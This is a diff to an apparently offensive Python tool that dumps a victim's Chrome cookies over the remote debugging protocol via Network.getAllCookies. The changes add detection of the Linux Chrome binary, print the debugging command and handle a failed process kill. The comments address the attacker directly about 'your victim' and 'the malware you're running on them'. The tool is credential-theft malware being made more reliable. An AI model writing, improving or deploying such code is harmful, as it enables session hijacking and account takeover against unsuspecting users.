@@ -20,6 +20,12 @@ GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"
 # Edit these if your victim has a wacky Chrome install.
 if sys.platform.startswith("linux"):
     CHROME_CMD = "google-chrome"
+
+    LINUX_CHROME_CMDS = ["/usr/bin/google-chrome-stable", "/usr/bin/google-chrome-stable", "/usr/bin/google-chrome"]
+    for cmd in LINUX_CHROME_CMDS:
+        if os.path.isfile(cmd):
+            CHROME_CMD = cmd
+
     USER_DATA_DIR = "$HOME/.config/google-chrome/"
 
 elif sys.platform == "darwin":
@@ -100,6 +106,8 @@ def summon_forbidden_protocol():
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
 
+    print(CHROME_DEBUGGING_CMD)
+
     # Hey some people have slow computers, quite possibly because of
     # all the malware you're running on them.
     time.sleep(5)
@@ -127,7 +135,10 @@ def cleanup(chrome_process):
     # I SURE HOPE there's no race condition, causing this to kill some other
     # innocent PID, crashing the victim's computer and ruining your operation.
 
-    os.kill(chrome_process.pid + 1, signal.SIGKILL)
+    try:
+        os.kill(chrome_process.pid + 1, signal.SIGKILL)
+    except ProcessLookupError:
+        print("Unable to kill the chrome process, do it manually!")
 
     # If we copied a Profile's User Data Directory somewhere, clean it up.
     if fake_user_data_dir is not None:
